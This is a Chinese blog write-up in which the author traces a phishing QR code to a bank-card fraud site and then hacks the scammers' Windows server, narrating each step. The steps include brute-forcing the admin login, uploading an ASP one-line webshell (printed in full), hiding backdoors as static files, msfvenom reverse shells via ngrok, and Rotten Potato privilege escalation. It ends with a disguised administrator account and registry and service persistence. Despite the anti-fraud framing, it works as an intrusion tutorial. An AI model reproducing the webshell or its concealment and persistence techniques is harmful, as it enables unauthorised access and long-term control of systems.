这是一则漫长又跌宕起伏的故事，小伙伴们请随意就坐，自备茶点。全文包含信息收集与攻克的详细全过程，以及对该类型诈骗思路的分析拆解，以提高防范意识。

## 0x00 梦的开始

那是一个阳光明媚的晌午，日常的搬砖过程中收到一封公司邮件，

![email-send](https://image.3001.net/images/20211018/1634547917_616d38cd2ee85fd58f3bc.png!small)

看到这熟悉的措辞，又瞄了一眼下面的附件内容，熟悉的气息扑面而来，就顺手保存了下来。

![email-qrcode](https://image.3001.net/images/20211018/1634547918_616d38ce0315d762eced0.png!small)

随即管理员立马发现了不对劲，追发邮件说员工账号被盗用，不要轻信邮件内容，原始邮件也被标为垃圾邮件（上次的类似邮件删的太突然，事情还没开始就结束了，这次总跑不掉了(￣_,￣
)，作为当代好青年，五星好市民，是时候发扬一下活雷锋精神了）；

而这张图片，就成了一切梦开始的地方……

## 0x01 信息收集

### 0x001 审查域名

起始信息非常有限，开局一张图，剧情全靠猜，不过这个入口也足够了，先拿出家伙解析下二维码中的信息：

![email-qrcode-analyze-url](https://image.3001.net/images/20211018/1634547918_616d38ced75680c582d45.png!small)

没有额外的数据，只有一串网页链接，看着这域名名称，嘴角微微上扬，先去解析一下域名：

![cmd-nslookup](https://image.3001.net/images/20211018/1634547919_616d38cfb5b406ddb399a.png!small)

到写文为止已经不能解析该域名了，整顿的倒挺快，不过好在之前有解析备份，域名万变不离其`IP`，并且也没有发现使用
CDN，流量全部通往源站；顺手查了一下，是香港的服务器：

![front-query-ip](https://image.3001.net/images/20211018/1634547920_616d38d050ec2c8cca8f2.png!small)

然后`whois`一下，搜集相关信息：

![cmd-whois](https://image.3001.net/images/20211018/1634547921_616d38d1282926422539f.png!small)

不出意外，又是用的三方注册机构，没有额外的有用信息，不过这个注册时间挺有意思，本月的，骗子同志动作还蛮快的；接下来只能去对方网站瞅瞅：

![front-west-whois](https://image.3001.net/images/20211018/1634547922_616d38d2020a5db3e641f.png!small)

又是西部数码，看来有些备受青睐，网站提供隐私保护机制，注册信息不对外公开，暂时也获取不到有用信息；

### 0x002 审查 IP

现在唯一的线索就是之前解析的那个 IP 了，一步一步来，先`nmap`扫一波端口服务先，收集更多信息：

![cmd-nmap-port-services](https://image.3001.net/images/20211018/1634547923_616d38d36609f49baca23.png!small)

嗯还行，看见了几个熟悉的身影，继续走流程，分别跑下默认脚本分析下端口服务信息：

![cmd-nmap-default-script](https://image.3001.net/images/20211018/1634547924_616d38d4438e3c9d0871d.png!small)

没有探测倒匿名 ftp，http
支持`TRACE`，没有设`httponly`，有执行`XSS`的机会，小本本先记下；然后老规矩，默认字典定向爆破一轮先，尝试还是要有的，万一那啥了呢：

![cmd-nmap-ftp-brute](https://image.3001.net/images/20211018/1634547925_616d38d52bfa0331d5ab0.png!small)

剩余端口也都试了，意料之中，没啥收获，看来基本的密码强度意识还是有的；另外之前的扫描扫描中有出现`8888`这个端口，记得这个是服务器管理工具 **宝塔**
面板的默认后台入口，访问一下试试：

![front-baota-login-pre](https://image.3001.net/images/20211018/1634547925_616d38d5e9603db3209d6.png!small)

有入口校验，起码证明确实是用的宝塔面板，不过这个爆破应该是不可能去爆破的，记得入口 url 后缀默认大概是 8 位任意大小写字母与数字的组合，就是 62 的
8 次方，大约两百万亿，就挺秃然的，先放在后面再说吧，接下来，继续转战其他方向：

### 0x003 审查页面

来都来了，既然扫码是跳转页面链接，并且端口也开放了 80 和 443，当然要打开网页访问一下康康，同时开启开发者工具，看看有啥小动作：

![front-home-mobile](https://image.3001.net/images/20211018/1634547926_616d38d67a8e91e2f4dd0.png!small)

哎呀，还识别机型，这靶向用户还挺明确，那就切成移动端看看：

![front-home-index](https://image.3001.net/images/20211018/1634547927_616d38d744d98d6e45597.png!small)

emm……怎么说呢，有那味儿了，咋一看还真看不出来，模仿的还挺全（不过胆也确实大，政府网站都搞），然后看了下接口返回的头信息，发现使用的`Windows
IIS 7.5 + ASP.NET`的服务：

![front-home-headers](https://image.3001.net/images/20211018/1634547928_616d38d875f7f079764a8.png!small)

这个先记着，后面漏洞挖掘用得着，后面试了一圈发现页面都是空壳，只有那个处理入口的弹窗能跳转，跳转页面是：

![front-apply-btn](https://image.3001.net/images/20211018/1634547929_616d38d9b41274420c563.png!small)

描述的还挺全，好让大家都能对号入座，这里点下立即申请：

![front-input-name-id](https://image.3001.net/images/20211018/1634547930_616d38da97785b777e793.png!small)

然后就开始了个人信息收集的一条龙服务，先是姓名和身份正号，另外，注意看旁边显示加载的 PNG
头图的名称，额难道这是开发者的疯狂暗示？？这里随便输入条信息进去看看：

![front-input-name-error](https://image.3001.net/images/20211018/1634547931_616d38db61758e3158298.png!small)

居然还有校验，打个断点看看源码逻辑：

![front-input-name-breakpoint](https://image.3001.net/images/20211018/1634547932_616d38dc8875a5e33ed46.png!small)

一个号码校验都整的这么齐全，还真是费心了，不过前端的校验都是纸老虎，这里也不用什么偏方了，直接用开发者工具的源码编辑覆盖功能，直接给校验函数返回`true`：

![front-input-name-override](https://image.3001.net/images/20211018/1634547933_616d38dd750231ea1d671.png!small)

然后校验通过，进入下一个步骤：

![front-input-bank](https://image.3001.net/images/20211018/1634547934_616d38de722240401f2fd.png!small)

这里是要收集银行卡号和密码以及绑定的手机号，唉，意图很明显，哪有打款转账还要对方密码的操作，这里也准备随便填下，银行卡校验用同样的方法绕过一下，不过在其中一个加载的脚本文件中发现了有意思的东西：

![front-input-bank-js-source](https://image.3001.net/images/20211018/1634547936_616d38e0d24cb7276157e.png!small)

开发者连源码中的调试数据都不删除，调的阿里支付的接口，正好借对方调试账号用一下下（再次证明了作为开发者，生产环境中代码移除注释的重要性=_=）：

![front-input-bank-amount](https://image.3001.net/images/20211018/1634547937_616d38e1ad55e3729c312.png!small)

然后进入了下一个页面，再次收集姓名和证件号，以及银行卡余额（这里应该是对用户真实情况进行摸底以及其他未知操作），下意识查了自己的余额，唉果然这里连撒谎的勇气都没有
T_T，马上填完进入下一步吧：

![front-input-bank-amount-value](https://image.3001.net/images/20211018/1634547938_616d38e2bdc6402940567.png!small)

![front-submit-loading](https://image.3001.net/images/20211018/1634547939_616d38e3a832fec2bb68b.png!small)

然后页面会一直加载不断刷新，再无其他跳转，应该是给诈骗者提供操作的时间，那么网页的相关操作就暂时告一段落，大致了解了一些操作步骤，接下来探索一下其他方向；

## 0x02 漏洞挖掘

### 0x001 SQL 注入

信息收集差不多了，现在来逐个击破，先从最熟悉的网页端入手，前面审查页面时有不少提交表单和输入框，这些都是潜在的攻破点；挖掘技术哪家强，先祭出神器`Burp`，拦截一下之前提交银行卡号密码的表单数据：

![burp-form-field](https://image.3001.net/images/20211018/1634547940_616d38e4a637d05edbf13.png!small)

然后对字段值进行简单注入尝试，检查报错信息：

![burp-sql-inject-simple](https://image.3001.net/images/20211018/1634547941_616d38e58d2a9860d7b0f.png!small)

没反应，应该是有基础校验，再换个：

![burp-sql-inject-union-select](https://image.3001.net/images/20211018/1634547942_616d38e681cfdbea9144d.png!small)

有反应，似乎看到了希望，虽然返回乱码了，应该是对方程序处理问题，不过看句式像是 SQL
报错，又接连试了几个，也是同样的返回，那么剩下的冗杂工作，就交给工具进行吧，掏出`sqlmap`跑一波：

![cmd-sqlmap](https://image.3001.net/images/20211018/1634547943_616d38e7682b90345be6a.png!small)

后面换了几轮参数也没成功，应该是过滤机制比较周到，然后在测试另一个页面时，才发现了那段报错信息的原本含义：

![burp-sql-inject-err-res](https://image.3001.net/images/20211018/1634547944_616d38e8600c10503f7eb.png!small)

嗯还是太年轻，会错意了，应该是程序识别到了字段值中的 SQL
关键字；另外回想起之前扫描到服务可能隐含`TRACE`相关漏洞，测试了下，应该是服务端暂未支持：

![burp-trace-method](https://image.3001.net/images/20211018/1634547945_616d38e9418f7452032ea.png!small)

然后又想了想，针对密码字段进行数据库表字段设计时，应该会考虑其字符位数低的特点，减少空间占用，因为这是银行卡密码，都知道是 6
位数字，这里传个大数看看有没有惊喜：

![burp-post-mass-data](https://image.3001.net/images/20211018/1634547946_616d38ea13763363bd551.png!small)

尴尬，是有惊无喜，应该是没有特别处理，直接反馈为服务端错误；后面又陆续换了几个页面，测试下来都没太大收获，场面又一度陷入僵局，只能又暂时转移战场；

### 0x002 Metasploit 渗透

终于到`Metasploit`出场了，蓄势待发，

![msf-banner](https://image.3001.net/images/20211018/1634547946_616d38ead66eee1924595.png!small)

先搜一下 IIS 的已知漏洞：

![msf-search-iis](https://image.3001.net/images/20211018/1634547947_616d38eb994946175a04f.png!small)

有不少，那就先调几个条件匹配的试一波，这里只放个示例，就不一一展示了：

![msf-run-ektron](https://image.3001.net/images/20211018/1634547948_616d38ecbbdfefbde0e1f.png!small)

然后就是其他几个端口、服务，挨个测试一遍，也没有什么突破，看来补丁都打的挺全；目前又暂时陷入了死胡同，虽然 msf
还有不少模块可以利用，不过暂时不准备继续深入试探了，因为想起来还有另外一件重要的事情还没做：

### 0x003 站点目录枚举

站点目录扫描，这件重要的事怎么能少得了，可供选择的工具很多，如`dirbuster`等，这里我们使用`Burp Suite`的`Engagement
tools`里的`Discovery content`工具，进行目录爆破：

![burp-dirbus-menu](https://image.3001.net/images/20211018/1634547949_616d38ed9953baca8bfbd.png!small)

![burp-dirbus-config](https://image.3001.net/images/20211018/1634547950_616d38ee80cebd4ed863c.png!small)

其内置的大量字典已经足够使用了，不过涉及网络请求，这个过程也是异常漫长，不过可以后台跑着，不影响做其他事，这里就直接贴一个扫描结果：

![burp-dirbus-sitemap](https://image.3001.net/images/20211018/1634547951_616d38ef465ce673268bf.png!small)

直呼好家伙！不扫不知道，出来吓一跳，居然错过了这么多隐藏入口，小本本记下先，后续挨个探索，不过呢视线情不自禁地锁定到了名为`upload.asp`这个文件上，开发者这么明显的暗示就无需我多言了（ㄟ(
▔, ▔ )ㄏ）；

![burp-upload-get](https://image.3001.net/images/20211018/1634547952_616d38f04fb2a56acda7b.png!small)

直接访问没什么返回数据，难道是方法不对？换成`POST`表单文件数据再试试：

![cmd-curl-upload-file](https://image.3001.net/images/20211018/1634547953_616d38f1123c8834bb914.png!small)

看来这样上传也没用，也许还要额外的校验参数之类的，上面不是刚扫了一堆没见过的页面嘛，现在回过头去挨个分析下页面源码看看，也许会有收获：

![front-upload-source](https://image.3001.net/images/20211018/1634547953_616d38f1c73cbe4c3ec23.png!small)

果然，在其中一个页面中，发现了调用这个上传接口的表单，是个隐藏元素，结合页面内容，应该是用于收集用户上传的某些证件信息，身份正照片之类的，然后看了对应的
js 源码，果然存在一些校验和接口参数：

![front-upload-js-fn](https://image.3001.net/images/20211018/1634547954_616d38f2da73ae94618fe.png!small)

这里去分析调用这些函数再上传文件太费劲了，这不是个隐藏表单嘛，直接改下代码通过 UI 操作多轻松 (¬‿¬)：

![front-upload-show-form](https://image.3001.net/images/20211018/1634547955_616d38f3db4b7a9652b0e.png!small)

样子虽然简陋了点，管他的，能跑起来就行了，上传个文件试试：

![front-upload-done](https://image.3001.net/images/20211018/1634547956_616d38f4bc7178dbe7976.png!small)

然后再访问看看效果：

![front-upload-access](https://image.3001.net/images/20211018/1634547957_616d38f558769b101e283.png!small)

好家伙，大写的激动！嘴角再度微微上扬，不过先冷静下，再试试有没有文件类型校验，服务是`ASP.NET`的，那就简单传个 asp
程序试试，下面的代码会在页面输出站点运行服务的名称：

    
    
    <% response.write(Request.ServerVariables("SERVER_SOFTWARE")) %>
    

然后上传上去看看：

![front-upload-asp-info](https://image.3001.net/images/20211018/1634547957_616d38f5e196db151fd2a.png!small)

这……俺还能说什么呢，此时无声胜有声`$_$`，不过这并不是终点，这只是一个良好的起点，一切才刚刚开始 (¬‿¬)；

### 0x004 意外收获

其实网站目录中还有一个很让人在意，就是叫`jieliuzi`这个目录，虽然摸透了对象开发者喜欢汉语拼音命名的习惯，但是这个含义始终未能参透，连蒙带猜外加输入法都未得其解，甚至后面进去一探究竟后没没想明白`=_=`，中华文化真是博大精深。不管了，看看页面访问结果：

![front-jieliuzi-login](https://image.3001.net/images/20211018/1634547958_616d38f6812957ebeb40b.png!small)

是个登录页，十分简洁，而且这其实是个 PC
站点页，骗子在某些方面也挺有情调的，这里不作展示是由于整图过于刺激（怎么说呢，额，这登录框真白），怕过不了审，另外，注意一下这个网页最上面的标题名，第一反应就是应该不会是简单的字面意思，听着也不像啥好词儿，为此专门去百度了一下：

![front-whaling-meaning-1](https://image.3001.net/images/20211018/1634547959_616d38f7867e2ef8cdb1b.png!small)

![front-whaling-meaning-2](https://image.3001.net/images/20211018/1634547960_616d38f86ba448ff757d6.png!small)

em……又长见识了，原来诈骗也能是一门学问，再结合最开始那张二维码的来源（企业邮件），看来是这么个意思了，大家平时也都 **注意警惕** 一下。

随后试了下登录，没有验证码或超时超次数验证这些，并且也没挖掘到可利用的 SQL
注入点，这种情况就该`Burp`的`Intruder`出场了，后台登录名一般都是`admin`，密码就祭出`rockyou.txt`跑一波先：

![burp-jieliuzi-intruder-config](https://image.3001.net/images/20211018/1634547961_616d38f94c46bb1240105.png!small)

![burp-jieliuzi-intruder-running](https://image.3001.net/images/20211018/1634547962_616d38fa08a26940cf67a.png!small)

这也是一个比较漫长的过程，不过一会儿之后再去看的时候就发现了变化：

![burp-jieliuzi-intruder-sql-warn](https://image.3001.net/images/20211018/1634547962_616d38fac8a13315d0dde.png!small)

需要留心的就是这里的返回数据长度，因为正常讲大部分试的密码都是错误的，服务器响应的数据大小也都是一样的，突然出现不一样的长度多半就出现了转机，这里看来是识别出了
sql 语句，和之前一样报错，然后看最上面那条：

![burp-jieliuzi-intruder-find](https://image.3001.net/images/20211018/1634547963_616d38fbe77b968ad3ad9.png!small)

整个列表中就这一条最特别，看返回也是 302
重定向，看来应该是密码对了跳转进页面了，然后看这密码，也是够随意的，看着简单，猜的时候谁又能想到呢，登录进去看看：

![front-jieliuzi-order-list](https://image.3001.net/images/20211018/1634547964_616d38fc8ac1ebbb50106.png!small)

![front-jieliuzi-ip-list](https://image.3001.net/images/20211018/1634547967_616d38ffee667dfd8571d.png!small)

……，唉，怎么说呢，应该是触目惊心吧，虽然数量没有一些媒体平台时不时报道那些的那么夸张，但也不是一个小数目了，而且每一处记录的银行卡账号、密码、身份正号、手机号、验证码、IP位置这些，都是近乎真实的。我不是正义的制裁者，也没有多少执行正义的力量，最多就热心的帮他们删个库再跑路，个人的力量太小了，所以这些还是都后面交给警察蜀黍处理吧，正义可能会迟到，但不会缺席。

## 0x03 获取权限

### 0x001 Get webshell

暂时先抛开题外话，上面进行到了文件上传这一步，文件上传可以意味着很多事情，可执行文件的上传便可以实现获取服务器的系统操作权限，当然这里的网页应用程序的相关权限一版很低，提权的事就是后话了；当前任务是拿下网站操作权限，即`webshell`，继续走流程，先上传个简单的
asp 版 **一句话木马** ：

    
    
    <% execute(request("pass")) %>
    

然后就该 **亮剑** 了：

![antsword-add-data-menu](https://image.3001.net/images/20211018/1634547975_616d3907097bd01352f87.png!small)

![antsword-add-data-detail](https://image.3001.net/images/20211018/1634547975_616d39079cc16db2c077a.png!small)

![antsword-add-data-success](https://image.3001.net/images/20211018/1634547976_616d3908420db120f7122.png!small)

搞定，进去康康：

![antsword-wwwroot-list](https://image.3001.net/images/20211018/1634547977_616d3909044c203aff3e6.png!small)

文件相关操作：

![antsword-wwwroot-list-menu](https://image.3001.net/images/20211018/1634547977_616d3909bc79ee6bc5ea5.png!small)

![antsword-file-edit](https://image.3001.net/images/20211018/1634547978_616d390aa6c52e65fd0cc.png!small)

数据库相关操作（对应之前后台页面的展示数据）：

![antsword-db-bank](https://image.3001.net/images/20211018/1634547979_616d390b97d778732d148.png!small)

命令行终端相关操作：

![antsword-cmd-home](https://image.3001.net/images/20211018/1634547980_616d390c8468398438dfa.png!small)

甚至获取 Windows 系统信息：

![antsword-cmd-systeminfo](https://image.3001.net/images/20211018/1634547981_616d390d4aa044ffb1369.png!small)

好了，这不啥都有了，还要啥自行车，但也不能止步于此，虽然现在拥有了对这整个站点的操作权限，包括文件及数据库的增删改查等，但也不至于为了正义用爱发电，每日蹲点删库删站，我们的目标还在山的那边
(ง •_•)ง

### 0x002 Backdoor

俗话讲，要生于忧患，虽然现在入口打通了，但是凡事都要留一手（我更喜欢留多手），防止木马那天被管理员察觉并清理就尴尬了，所以找几个隐蔽的位置，再上传几个，比如平时几乎不被注意的
css 或图片等静态资源文件夹，js 库文件等，文件命名上也可以花点心思，模仿已有文件或者配置文件之类的，使人有一种一眼看上去是正常文件的幻觉（+_+）；

![antsword-backdoors](https://image.3001.net/images/20211018/1634547982_616d390e28544975e2dfb.png!small)

当然，还可以利用一种技术，简单讲就是 Windows
中我们熟知的隐藏文件，一般一些软件或系统的配置文件会通过这样的方式隐藏，防止普通用户误删改，查看也能简单，像下面这样勾选一些就都出来了：

![antsword-explorer-hidden-file](https://image.3001.net/images/20211018/1634547982_616d390eac739e1e4849d.png!small)

所以我们这里可以通过 shell 命令把指定文件隐藏掉，使得其不会被轻易发现：

![antsword-cmd-attrib](https://image.3001.net/images/20211018/1634547983_616d390f49eab46a7e134.png!small)

### 0x003 Get shell

目前我们获取到的还只是`webshell`，虽然可以模拟执行终端命令，但是这些都是通过上传的 asp 后门程序执行的，就是说每步操作都会发起 http
请求，防止被平台记录，需要获取系统`shell`，即上传系统可执行文件（如`.exe`文件，就是俗称的 **木马**
），至于如何生成，就需要`metasploit`再次登场了。

这里又涉及一些东西，getshell
的木马一般有两种，正向连接和反向连接，基础的认知可能是将程序上传至机器，然后运行就会后台监听某个端口，等待外部的连接，连上后就可以通过两端的交互达到控制系统，当然前提是系统防火墙没开或者允许该端口放行，而通常服务器都会开启防火墙并过滤端口，只放行指定的几个。

所以后面出现了第二种类型，反向连接，或者叫反弹
shell，简单讲就是第一种类型反转一下，不是目标机器等待我们连，而是我们外部的机器等待目标机器来连接，这解决了防火墙端口的限制，因为防火墙一般不会特意去限制出站端口，当然这种类型又增加了额外的限制，首先我们需要一台具有公网
IP 的机器，像平常这种连着 WiFi， 深埋于 n 层路由下的设备，基本可以放弃了（使用端口转发也需要运营商提供公网
IP），另外就是需要目前机器可访问公网，因为有些服务器考虑安全因为是在内外下的，用反向代理等方式传输流量，无法访问外网。

由于不清楚对方防火墙情况，先用反向连接看看，手边暂时没有公网机器，就先用`ngrok`转发一下端口流量，先启动服务。

![cmd-ngrok-running](https://image.3001.net/images/20211018/1634547984_616d3910113c2d29a0748.png!small)

从之前收集的数据中得知，对方机器是 x64 Windows
系统，那么这里就直接用`msfvenom`生成对应的`payload`（暂时先不考虑加密加壳这些，传上去看看是否被杀毒再说）：

![cmd-msfvenom-generate-api](https://image.3001.net/images/20211018/1634547984_616d3910bdfb41c13e90c.png!small)

`reverse_tcp`是反向连接，`bind_tcp`是正向连接，连接地址填 ngrok
提供的链接，端口填链接对应的，然后生成执行文件，最后上传到对方站点某个隐蔽的目录下：

![antsword-upload-api](https://image.3001.net/images/20211018/1634547985_616d39117f9275bfcbf81.png!small)

![antsword-upload-api-success](https://image.3001.net/images/20211018/1634547986_616d3912819bff16c590e.png!small)

然后在 msf 中启动监听程序，等待对方连接，地址填本地，端口填之前 ngrok 中设定的本地端口，使用的 pyaload
要和之前`msfvenom`中配置的一致，不然会连接失败；完成后，一旦目标上的程序启动，首先就会访问 ngrok 域名和对应端口，ngrok
服务再把传输数据转发到本地的监听端口中，数据就通过这一层中介进行双向传输：

![msf-run-reverse-listener](https://image.3001.net/images/20211018/1634547987_616d3913795dd97bbee8f.png!small)

然后在 webshell 中执行它：

![antsword-cmd-run-api](https://image.3001.net/images/20211018/1634547988_616d391448d274b587ce9.png!small)

![antsword-cmd-list-api](https://image.3001.net/images/20211018/1634547988_616d3914ddbf59e0036ee.png!small)

运行成功，这是切换回 msf 一会后就会有所反应，表示连接成功：

![msf-reverse-connected](https://image.3001.net/images/20211018/1634547989_616d391586bfcacf8d28b.png!small)

现在再查看 ngrok 服务就回显示有一条连接，表示可以进行通信了：

![cmd-ngrok-connected](https://image.3001.net/images/20211018/1634547990_616d391652e19a1d61667.png!small)

现在连接成功进入的操作界面是`meterpreter`，这是`metasploit`提供的有许多拓展功能的集成终端，类似于
cmd、shell，但是功能更强大，可以执行切换目录、获取系统信息、操作进程、上传下载文件、进一步渗透等操作，甚至在拿下 system
权限后，还能解锁控制鼠标键盘、屏幕截图或实时预览等高级功能，这里先查询下基础信息：

![meter-getinfo](https://image.3001.net/images/20211018/1634547991_616d3917085824df002b9.png!small)

和之前的虚拟终端一样，当前操作用户是 IIS，当然这里想用 cmd
终端操作也是可以的，执行下`shell`命令进入系统`shell`，操作和命令与系统命令提示符没有两样：

![meter-shell-command-test](https://image.3001.net/images/20211018/1634547991_616d3917987a8b34329e1.png!small)

初次进入可能会出现中文字符乱码情况，因为 cmd 默认使用的字符集问题，手动切换成 UTF-8 的 65001
就行了，可能唯一不太方便的地方，就是没有集成历史记录的功能，要重试上个命令得全部重打一遍，毕竟是网络转发数据，不应要求太多。

### 0x004 Get system

如上面所讲，目前获取到的只是普通账户的`shell`，虽然有一定的终端操作权限，但还是远远不够的，会有诸多限制，比如无法操作一些服务、增删系统账户、访问系统目录等等，那么接下来的操作就是
**shell 提权** 了，或者叫 getsystem，这也是 meterpreter
中的一条命令，功能和描述一样，会尝试多种漏洞进行权限提升以获取`SYSTEM`权限，只不过试了下似乎都没有成功，只能另寻他法：

![meter-getsystem-err](https://image.3001.net/images/20211018/1634547992_616d39182be1a6dbe4b89.png!small)

这里值得说的是，可能有小伙伴会有疑惑，认知中 Windows
系统中权限最高的不应该是超级管理员`Administrator`吗，为什么一直在强调获取`SYSTEM`账户权限，其实严格来讲，Administrator
账户虽然成为管理员，其实权限并不是最高的，也有很多它做不了的事，举个简单的例子就是删除系统账户`Guest`：

![cmd-admin-del-guest](https://image.3001.net/images/20211018/1634547992_616d3918cf2f46116999e.png!small)

以及其他一些系统层面的事，administrator
也做不到，而这些高层次的操作都由`SYSTEM`账户来完成，虽然在账户设置里面从没见过它，但它是确确实实存在的：

![explorer-system-account](https://image.3001.net/images/20211018/1634547993_616d3919601e5ed510624.png!small)

就像网站服务其实也有个对应的 www 账户一样，应该没人曾经登录过它吧。

前面讲获取 system 权限使用`getsystem`不奏效，那么就继续试探一下其他路子，也就是 **令牌窃取**
，令牌指的登录令牌，类似登录网站要用的`cookies`或者`token`，而 Windows 中存在两种令牌：`Delegation
Tokens`（授权令牌） 和`Impersonation
Tokens`（模拟令牌），前者用于交互式的登录，如直接或使用远程桌面，输入账号密码登录进系统，而后者用于非交互式的会话中，访问网络驱动或其他域登录脚本程序。

这里要利用的正是模拟令牌，窃取的过程有些类似网站里的 cookies
窃取，由于令牌在重启系统之前，会一直被保留，所以有账户登陆过的话，其令牌有机会被冒充使用，而且有授权令牌登录的账户注销的话，令牌也会转化为模拟令牌，同时其原本的相关权力都会保留。

这里接下来就先使用`incognito`（伪装、隐瞒的意思，偷盗者总是会先隐藏起来嘛）插件，进行令牌盗取，再用`list_token`命令查询当前能获取的令牌情况（数量因当前的
shell 权限而定）：

![meter-list-tokens](https://image.3001.net/images/20211018/1634547994_616d391a2088410ce1494.png!small)

这里可以看到可盗取令牌的账户，要窃取的话就使用`impersonate_token`命令：

![meter-impersonate-iusr](https://image.3001.net/images/20211018/1634547995_616d391b114f40d1040df.png!small)

虽然可以窃取成功，但试了下这个账户的权限也不高，尝试性的试了下 system 账户也失败：

![meter-impersonate-try-system](https://image.3001.net/images/20211018/1634547995_616d391bd7644bef7b5f2.png!small)

所以只能再尝试其他提权漏洞了，这里就先用`bg`命令把当前 meterpreter 会话切换至后台，回到 msf 界面，使用一个已知的`Rotten
Potato`提权漏洞：

![msf-use-rotten-potato](https://image.3001.net/images/20211018/1634547997_616d391d1168909556691.png!small)

需要的唯一参数是会话 id，正好可以利用刚才的 meterpreter 会话，然后还需要设置一个
payload，这里之前有了解过，目前机器可以访问公网，而且虽然有使用防火墙过滤端口，但是似乎一直开着这么一群端口：

![meter-netstat](https://image.3001.net/images/20211018/1634547997_616d391dc8dcece77028d.png!small)

这是远程 RPC
需要使用的一系列端口，所以盲猜机器会开放`49150-49160`这么一个范围的端口，那么就见缝插针，选一个没被占用的用于开启监听，这样就能直接使用正向连接了，而不用麻烦的再次使用反向连接：

![msf-config-rotten-potato](https://image.3001.net/images/20211018/1634547998_616d391e9a7a313a73f29.png!small)

地址填目标机器的地址，这样运行后就能自动连接到目标机器的监听端口上，这里先运行一下试试能不能成功：

![msf-run-rotten-potato-success](https://image.3001.net/images/20211018/1634547999_616d391f5533fc4975efb.png!small)

哟西！竟然比想象中的顺利，就不多解释了，检查一下权限和令牌先：

![msf-rotten-potato-getsystem-success](https://image.3001.net/images/20211018/1634548000_616d392047a136a4a42ce.png!small)

Nice，成过窃取到了 system 账户的令牌，以对方身份登录成过，接下来就可以试试权限了：

![meter-shell-system-add-user](https://image.3001.net/images/20211018/1634548001_616d3921038e65284ec2b.png!small)

进入 shell 后账户确实变成了 SYSTEM，也能增加或删除账户了，那么至此，成过拿下系统最高权限，成功 getsystem；

### 0x005 权限测试

回想起前面有说过，高权限可以获取屏幕截图或者实式预览，那么这里来就看一下下：

![meter-screenshot-saved](https://image.3001.net/images/20211018/1634548001_616d3921a0cc3267e8539.png!small)

成功截图到了指定文件，打开看看：

![meter-screenshot-view](https://image.3001.net/images/20211018/1634548002_616d3922502badce89f6e.png!small)

虽然分辨率有点低，但大致是个登录界面的模样，然后实时预览看看，由于这个要启动图形服务，就在虚拟机里跑一下：

![meter-screenshare](https://image.3001.net/images/20211018/1634548005_616d3925b004a5b90e085.png!small)

大晚上的，应该没啥人登录，，不过光是预览还不够，现在是可以直接远程登录进去的，只是需要额外的一些操作，先建立一个账户并分配管理员权限（即加入`Administrators`用户组），名字同样可以取得有一定迷惑性：

![meter-add-user-sys](https://image.3001.net/images/20211018/1634548009_616d3929a6bb626911f71.png!small)

不过光是这样还仍没有远程登录的权限，需要将用户分配进远程桌面用户组才具有登录权限：

![meter-add-sys-rdp](https://image.3001.net/images/20211018/1634548010_616d392a7b81c6238ae75.png!small)

然后这里本来是要开启远程桌面服务的（`TermService`），结果查询发现是已经开启的，然后一路追踪到了服务对应的进程，进程对应的端口：

![meter-shell-find-termservice](https://image.3001.net/images/20211018/1634548011_616d392b3f2e5e85a7ccd.png!small)

居然默认端口从 3386 改成了 10086，有意思，之前端口扫描默认常用端口，难怪没有扫出来，既然现在用户和密码都有了，登录进去看看：

![rdp-connect-pannel](https://image.3001.net/images/20211018/1634548012_616d392c03e7a5ef8aa1a.png!small)

![rdp-connecting](https://image.3001.net/images/20211018/1634548012_616d392c9ef3744716d9e.png!small)

![rdp-desktop-view](https://image.3001.net/images/20211018/1634548013_616d392da950720d5c64e.png!small)

唉，都舍不得掏钱整台配置好一点的，一点都不懂得投资 ㄟ( ▔, ▔ )ㄏ，没意思，擦擦屁股溜了溜了(～￣▽￣)～；

### 0x005 System Backdoor

老规矩，任何阶段都需要留一手，并且现在 system 权限，因此只要留下后门那么再次连接就直接具有 system
权限，那么话不多说直接上传，文件名同样可以取得有一定迷惑性：

![meter-upload-conf](https://image.3001.net/images/20211018/1634548014_616d392e9445e00c270a2.png!small)

然后配置程序开机启动：

![meter-shell-reg-add](https://image.3001.net/images/20211018/1634548015_616d392f50a531b0db968.png!small)

当然，要想再留一手就可以再创建个系统服务，只是生成的 payload 要用 service 类型的，不然会启动失败：

![cmd-gen-payload-exe-service](https://image.3001.net/images/20211018/1634548015_616d392fe9a69be14d3b6.png!small)

然后上传后在目标机器创建服务，配置开机自启，也可以再额外配置启动失败后自动重启服务，或者最近调用执行其他程序，最后再手动启动一次服务：

![meter-shell-sc-create](https://image.3001.net/images/20211018/1634548016_616d39309d81424f3759b.png!small)

至此，大部分流程基本结束，拥有系统权限可以做更多的拓展渗透，这些都是后话。

## 0x04 套路分析

### 0x001 作案工具

目前为止一共收集到两个后台，一个宝塔面板和一个捕鲸系统后台，宝塔之前是由于有登录校验，没有获取到登录入口，现在就轻松了，用宝塔自带命令`bt
default`查看一下默认入口和账号信息：

![meter-baota-default](https://image.3001.net/images/20211018/1634548017_616d39317d162fc7d38a1.png!small)

额……者用户名难道是要暗示自己输得起？待会用这个账号和密码登进去看看，另外在查看目录时，又发现了有意思的部分：

![meter-baota-hosts-list](https://image.3001.net/images/20211018/1634548018_616d39323782955d5e9fa.png!small)

这里还列出了不少站点，难道现在诈骗也搞分布式作案了 ( $ _ $ )，或者微诈骗？算了后面有机会再去一锅端了，先登录进去看看：

![front-baota-login-default](https://image.3001.net/images/20211018/1634548018_616d3932d018a2d0633f8.png!small)

看了默认密码被换调了，虽然现在有权限能直接改掉密码，为了不打草惊蛇，就先放一放，反正进去也都是一些可视化服务器配置，毕竟现在服务器的系统权限都攥在手上呢，不必着急，主要先分析下另外一套系统，那才是骗子们的主要作案工具。

可以观察页面存在两列功能栏，分别罗列着骗子能远程执行的操作：

![front-jieliuzi-func-1](https://image.3001.net/images/20211018/1634548019_616d3933a9b74a65522a0.png!small)

![front-jieliuzi-func-2](https://image.3001.net/images/20211018/1634548022_616d3936e27ff10bedc3b.png!small)

两列功能类似，只有个别区别，这里贴个图对比一下，感觉功能 2 应该是 1
的升级版，多加了几个功能，不过后面发现并不是这么简单，二者都能使用，这样是为了方便骗子连环套取用户信息：

![front-jieliuzi-func-compare](https://image.3001.net/images/20211018/1634548026_616d393aba06ad6b254fc.png!small)

### 0x002 诈骗流程

最前面的捕鲸邮件这些就不说了，就是邮箱盗号后广发邮件撒网罢了，现在主要来看下上面的一堆功能项，为了行骗过程操作方便，大部分功能应该都是字面意思，还记得最开始审查页面的时候，最后是停在了一个加载页上面，那么应该就是衔接这里的操作的，不同的功能项会触发不同的返回结果：

